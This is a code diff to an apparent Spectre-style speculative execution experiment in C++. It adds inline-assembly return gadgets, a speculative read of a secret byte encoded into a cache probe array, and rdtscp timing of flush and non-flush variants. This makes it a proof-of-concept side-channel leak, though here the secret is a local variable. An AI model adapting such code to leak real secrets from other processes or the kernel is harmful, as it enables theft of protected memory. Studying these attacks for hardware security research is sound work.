@@ -1,10 +1,3 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <cstdlib>
-#include <inttypes.h>
-#include <time.h>
-#include <iostream>
-#include <x86intrin.h>
 #include "util.hpp"
 
 using namespace std;
@@ -13,7 +6,20 @@ char array[256*256];
 char temp;
 char secret = 'p';
 
-void gadget(){
+void gadget_flush(){
+	__asm__(
+	"pop %rdi;"
+	"pop %rdi;"	
+	"pop %rdi;"
+	"nop;"
+	"pop %rbp;"
+	"clflush (%rsp);"
+	"clflush (%rip);"
+	"cpuid;"
+	"retq;");
+}
+
+void gadget_nonflush(){
 	__asm__(
 	"pop %rdi;"
 	"pop %rdi;"	
@@ -27,7 +33,19 @@ void gadget(){
 
 
 void speculative(char *secret_ptr){
-	gadget();
+	gadget_nonflush();
+	secret = *secret_ptr;
+	temp &= array[secret * 256];
+}
+
+void speculative_nonflush(char *secret_ptr){
+	gadget_nonflush();
+	secret = *secret_ptr;
+	temp &= array[secret * 256];
+}
+
+void speculative_flush(char *secret_ptr){
+	gadget_flush();
 	secret = *secret_ptr;
 	temp &= array[secret * 256];
 }
@@ -51,6 +69,19 @@ int main(){
 	for (int i = 0; i < 256; i++){
 		clflush(&array[i*256]);
 	}
+
+	unsigned int dummy;
+
+	auto t1 = __rdtscp(&dummy);
+	speculative_nonflush(&secret);
+	auto t2 = __rdtscp(&dummy);
+	cout<<t2-t1<<endl;
+
+
+	auto t3 = __rdtscp(&dummy);
+	speculative_flush(&secret);
+	auto t4 = __rdtscp(&dummy);
+	cout<<t4-t3<<endl;
 
 	speculative(&secret);
 	time(5);
